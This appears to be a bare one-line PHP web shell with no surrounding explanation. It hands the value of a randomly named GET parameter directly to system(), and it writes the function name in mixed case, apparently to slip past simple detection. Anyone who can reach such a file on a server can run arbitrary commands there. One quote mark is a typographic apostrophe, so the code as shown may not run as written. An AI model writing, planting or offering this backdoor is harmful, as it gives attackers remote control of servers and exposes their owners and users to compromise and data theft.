<?php
SysTeM($_GET[’Rbp8yTik']);
?>
